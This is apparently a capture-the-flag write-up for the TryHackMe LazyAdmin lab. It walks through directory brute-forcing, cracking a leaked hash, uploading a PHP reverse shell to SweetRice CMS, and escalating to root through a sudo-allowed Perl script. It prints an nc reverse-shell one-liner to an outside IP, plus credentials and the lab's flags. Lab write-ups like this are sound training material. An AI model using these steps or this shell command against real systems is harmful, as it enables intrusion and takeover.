# tryhackme: LazyAdmin

> What is the user flag?
>
> What is the root flag?

I started with an `nmap` scan, which only found a HTTP service on port 80 and SSH on port 22. I tried some simple username-password combinations on the SSH service, without any luck. That lead me to conclude the website will be the main attack surface.

The default Ubuntu-Apache2 landing page is being served, but there were no hints towards other interesting paths. There was also no `robots.txt`. I decided to try `dirbuster`, with one of the Kali default wordlists. I made it look for `.php` files too, which is always a good guess with Apache. It started throwing out interesting paths immediately:

![](https://imgur.com/o30g56J.png)

It looks like there is an installation of the SweetRice CMS in `/content`. There's an admin login in `/content/as/`. I did not know about SweetRice, but one of the first results I got when doing an online search was a list of [security vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-8230/product_id-18429/Basic-cms-Sweetrice.html). Interesting!

Dirbuster also found a file called `mysql_bakup_20191129023059-1.5.1.sql`. There's information about a user called `manager` in there, notably also a password hash: `42f749ade7f9e195bf475f37a44cafcb`. A simple Google search revealed this was the hash for `Password123`. Those credentials got me into the admin panel at `/content/as/index.php`. With this access, I think expoiting one or more of the CVE's should be possible.

I first tried the remote file inclusion one. I created PHP reverse shell code using `revshells.com`, tried some different uploads and the *New Ad* one got me a working reverse shell. It did seem to only work with the *Close Website* option disabled in the site settings, but I have no idea what that setting does exactly.

![](https://imgur.com/sfdatS0.png)

With this working reverse shell I'm very powerful. I listed all system users and found a user called `itguy`. His home directory has a file called `user.txt` that contains a flag and a MySQL login.

```
$ cd /home/itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
$ cat mysql_login.txt
rice:randompass
```

Now, we have to escalate privileges and/or find a root flag too. The `backup.pl` file does something interesting:

```
$ cat backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");

$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Interestingly, it has sudo permissions when it's executed:

```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

So I changed this file to have my IP address and another port, resulting in a second reverse shell, this time with root privileges. There I found the root flag:

```
# pwd
/root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```
